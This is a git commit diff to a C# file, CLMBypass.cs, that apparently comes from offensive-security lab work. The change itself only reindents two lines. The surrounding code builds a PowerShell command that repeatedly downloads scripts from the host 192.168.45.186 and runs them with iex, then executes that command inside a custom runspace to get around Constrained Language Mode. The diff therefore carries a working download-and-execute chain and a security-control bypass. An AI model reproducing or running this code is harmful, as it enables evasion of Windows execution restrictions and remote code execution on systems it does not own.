1c5ed296f725f567f851dadad6c8505789c5a6de
ofirsw <97940480+ofirsw@users.noreply.github.com>
2024-02-22 14:30:37 +0200

    Update CLMBypass.cs

--- Bypass/CLMBypass.cs
+++ Bypass/CLMBypass.cs
@@ -19,8 +19,8 @@ namespace Bypass
         {
             String cmd = "iex((iwr -usebasicparsing -uri http://192.168.45.186/bypass/1.txt).Content); Start-Sleep 2; echo 1; iex((iwr -usebasicparsing -uri http://192.168.45.186/bypass/2.txt).Content); Start-Sleep 2; echo 2; iex((iwr -usebasicparsing -uri http://192.168.45.186/bypass/3.txt).Content); Start-Sleep 5; echo 3; iex((iwr -usebasicparsing -uri http://192.168.45.186/bypass/4.txt).Content); Start-Sleep 5; echo 4; iex((iwr -usebasicparsing -uri http://192.168.45.186/run.txt).Content); echo Done;";
             // To first test if it works:
-			// String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Users\\Public\\test.txt"
-			Runspace rs = RunspaceFactory.CreateRunspace();
+            // String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Users\\Public\\test.txt"
+            Runspace rs = RunspaceFactory.CreateRunspace();
             rs.Open();
             PowerShell ps = PowerShell.Create();
             ps.Runspace = rs;
